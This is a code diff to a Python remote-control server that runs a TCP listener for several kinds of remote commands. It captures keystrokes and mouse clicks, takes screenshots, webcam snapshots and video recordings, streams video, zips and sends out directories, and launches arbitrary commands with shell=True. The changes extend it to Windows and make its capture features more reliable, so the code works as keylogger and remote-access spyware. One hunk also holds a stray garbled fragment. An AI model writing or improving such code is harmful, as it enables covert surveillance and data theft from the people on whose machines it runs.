@@ -16,6 +16,7 @@ import time
 import re
 import zipfile
 import sys
+import os
 from pathlib import Path
 from pynput import keyboard, mouse
 
@@ -84,28 +85,40 @@ class KillProcCommand(BaseCommand):
 class ListAppsCommand(BaseCommand):
     def execute(self, server, conn, data):
         apps = []
-        search_paths = [Path("/usr/share/applications"), Path("/var/lib/snapd/desktop/applications"), Path.home()/".local/share/applications"]
-        for p in search_paths:
-            if p.exists():
-                for f in p.glob("*.desktop"):
-                    try:
-                        with open(f, 'r', errors='ignore') as df:
-                            content = df.read()
-                            name = re.search(r'^Name=(.*)', content, re.M)
-                            exec_c = re.search(r'^Exec=(.*)', content, re.M)
-                            if name and exec_c:
-                                apps.append({"name": name.group(1).strip(), "exec": re.sub(r'%[a-zA-Z]', '', exec_c.group(1)).strip(), "sw": "Application" in content})
-                    except: continue
-        apps.sort(key=lambda x: x['sw'], reverse=True)
+        if sys.platform == "linux":
+            search_paths = [Path("/usr/share/applications"), Path("/var/lib/snapd/desktop/applications"), Path.home()/".local/share/applications"]
+            for p in search_paths:
+                if p.exists():
+                    for f in p.glob("*.desktop"):
+                        try:
+                            with open(f, 'r', errors='ignore') as df:
+                                content = df.read()
+                                name = re.search(r'^Name=(.*)', content, re.M)
+                                exec_c = re.search(r'^Exec=(.*)', content, re.M)
+                                if name and exec_c:
+                                    apps.append({"name": name.group(1).strip(), "exec": re.sub(r'%[a-zA-Z]', '', exec_c.group(1)).strip(), "type": "Application"})
+                        except: continue
+        elif sys.platform == "win32":
+            # Basic Windows App listing (Start Menu)
+            search_paths = [Path(os.environ["ProgramData"]) / "Microsoft/Windows/Start Menu/Programs", Path(os.environ["AppData"]) / "Microsoft/Windows/Start Menu/Programs"]
+            for p in search_paths:
+                if p.exists():
+                    for f in p.rglob("*.lnk"):
+                        apps.append({"name": f.stem, "exec": str(f), "type": "Shortcut"})
+        
+        apps.sort(key=lambda x: x['name'].lower())
         server.send_json(conn, apps)
 
 @CommandRegistry.register("START_APP")
 class StartAppCommand(BaseCommand):
     def execute(self, server, conn, data):
         try:
-            subprocess.Popen(data['exec'], shell=True, start_new_session=True)
+            if sys.platform == "win32": os.startfile(data['exec'])
+            else: subprocess.Popen(data['exec'], shell=True, start_new_session=True)
             conn.sendall(b"OK")
-        except: conn.sendall(b"FAIL")
+        except Exception as e:
+            logging.error(f"Start App Error: {e}")
+            conn.sendall(b"FAIL")
 
 @CommandRegistry.register("LIST_FILES")
 class ListFilesCommand(BaseCommand):
@@ -122,59 +135,84 @@ class ListFilesCommand(BaseCommand):
 class DownloadCommand(BaseCommand):
     def execute(self, server, conn, data):
         p = Path(data['path'])
+        temp_zip = None
         if p.is_dir():
-            zip_p = Path("temp_dl.zip")
-            with zipfile.ZipFile(zip_p, 'w') as z:
-                for f in p.rglob('*'): z.write(f, f.relative_to(p))
-            p = zip_p
+            temp_zip = Path("temp_dl.zip")
+            with zipfile.ZipFile(temp_zip, 'w') as z:
+                for f in p.rglob('*'):
+                    try: z.write(f, f.relative_to(p))
+                    except: continue
+            p = temp_zip
+        
         if p.is_file():
             sz = p.stat().st_size
             conn.sendall(struct.pack("!Q", sz))
             with open(p, "rb") as f:
                 while chunk := f.read(32768): conn.sendall(chunk)
-        else: conn.sendall(struct.pack("!Q", 0))
+        else:
+            conn.sendall(struct.pack("!Q", 0))
+        
+        if temp_zip and temp_zip.exists():
+            try: temp_zip.unlink()
+            except: pass
 
 @CommandRegistry.register("SCREENSHOT")
 class ScreenshotCommand(BaseCommand):
     def execute(self, server, conn, data):
-        with mss.mss() as sct:
+        try:
             if data.get('mode') == "WEBCAM":
-                cap = cv2.VideoCapture(0); ret, img = cap.read(); cap.release()
-                if not ret: return
+                cap = cv2.VideoCapture(0)
+                ret, img = cap.read()
+                cap.release()
+                if not ret: 
+                    conn.sendall(struct.pack("!I", 0))
+                    return
             else:
-                img = np.array(sct.grab(sct.monitors[1]))
-                img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
-            _, enc = cv2.imencode('.jpg', img)
+                with mss.mss() as sct:
+                    img = np.array(sct.grab(sct.monitors[1]))
+                    img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
+            
+            _, enc = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, 85])
             raw = enc.tobytes()
             conn.sendall(struct.pack("!I", len(raw)) + raw)
+        except Exception as e:
+            logging.error(f"Screenshot Error: {e}")
+            conn.sendall(struct.pack("!I", 0))
 
 @CommandRegistry.register("REC_START")
 class RecStartCommand(BaseCommand):
     def execute(self, server, conn, data):
         server.is_recording = True
-        server.recorder = cv2.VideoWriter("temp_rec.mp4", cv2.VideoWriter_fourcc(*'mp4v'), 10, (1280, 720))
+        # Initial recorder will be handled in handle_stream to match resolution
         conn.sendall(b"OK")
 
 @CommandRegistry.register("REC_STOP")
 class RecStopCommand(BaseCommand):
     def execute(self, server, conn, data):
         server.is_recording = False
-        if server.recorder: server.recorder.release(); server.recorder = None
+        time.sleep(0.5) # Give it a moment to finalize
+        if server.recorder:
+            server.recorder.release()
+            server.recorder = None
+        
         p = Path("temp_rec.mp4")
         if p.exists():
-            conn.sendall(struct.pack("!Q", p.stat().st_size))
+            sz = p.stat().st_size
+            conn.sendall(struct.pack("!Q", sz))
             with open(p, "rb") as f:
                 while chunk := f.read(32768): conn.sendall(chunk)
-        else: conn.sendall(struct.pack("!Q", 0))
-import os
-import socket
-...
+            try: p.unlink()
+            except: pass
+        else:
+            conn.sendall(struct.pack("!Q", 0))
+
 @CommandRegistry.register("GET_LOGS")
 class GetLogsCommand(BaseCommand):
     def execute(self, server, conn, data):
-        logs = list(server.activity_logs)
-        server.activity_logs.clear()
-        server.send_json(conn, logs)
+        logs = "\n".join(server.activity_logs)
+        server.activity_logs.clear() # Clear after sending
+        p = logs.encode('utf-8')
+        conn.sendall(struct.pack("!I", len(p)) + p)
 
 @CommandRegistry.register("SHUTDOWN")
 class ShutdownCommand(BaseCommand):
@@ -249,10 +287,13 @@ class ControlServer:
 
     def start_listeners(self):
         def op(k):
-            try: self.activity_logs.append(f"[{time.strftime('%H:%M:%S')}] Key: {k.char}")
-            except: self.activity_logs.append(f"[{time.strftime('%H:%M:%S')}] Special: {k}")
+            try: 
+                char = k.char if hasattr(k, 'char') else str(k)
+                self.activity_logs.append(f"[{time.strftime('%H:%M:%S')}] Key: {char}")
+            except: pass
         def oc(x, y, b, p):
             if p: self.activity_logs.append(f"[{time.strftime('%H:%M:%S')}] Mouse {b} at ({x}, {y})")
+        
         self.kl = keyboard.Listener(on_press=op); self.kl.start()
         self.ml = mouse.Listener(on_click=oc); self.ml.start()
 
@@ -284,13 +325,28 @@ class ControlServer:
                     else:
                         ret, f = cam.read()
                         if not ret: f = np.zeros((480, 640, 3), np.uint8)
-                    if self.is_recording and self.recorder: self.recorder.write(cv2.resize(f, (1280, 720)))
-                    if not self.is_streaming: time.sleep(0.5); continue
+                    
+                    # Recording logic
+                    if self.is_recording:
+                        if self.recorder is None:
+                            h, w = f.shape[:2]
+                            self.recorder = cv2.VideoWriter("temp_rec.mp4", cv2.VideoWriter_fourcc(*'mp4v'), 10, (w, h))
+                        self.recorder.write(f)
+                    elif self.recorder:
+                        self.recorder.release()
+                        self.recorder = None
+                    
+                    if not self.is_streaming: 
+                        time.sleep(0.5)
+                        continue
+                        
                     _, enc = cv2.imencode('.jpg', f, [cv2.IMWRITE_JPEG_QUALITY, 45])
                     b = enc.tobytes()
                     conn.sendall(struct.pack("!I", len(b)) + b)
             except: pass
-            finally: conn.close(); cam.release()
+            finally: 
+                conn.close()
+                cam.release()
 
     def command_loop(self):
         raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -309,7 +365,10 @@ class ControlServer:
             pwd = conn.recv(1024).decode()
             if pwd != self.password:
                 res = json.dumps({"status": "FAIL", "msg": "Invalid Password"}).encode()
-                conn.sendall(struct.pack("!I", len(res)) + res); conn.close(); return
+                conn.sendall(struct.pack("!I", len(res)) + res)
+                conn.close()
+                return
+            
             res = json.dumps({"status": "OK", "w": self.native_res[0], "h": self.native_res[1]}).encode()
             conn.sendall(struct.pack("!I", len(res)) + res)
             
@@ -345,4 +404,5 @@ if __name__ == "__main__":
     try:
         while True: time.sleep(1)
     except KeyboardInterrupt:
-        server.stop(); sys.exit(0)
+        server.stop()
+        sys.exit(0)
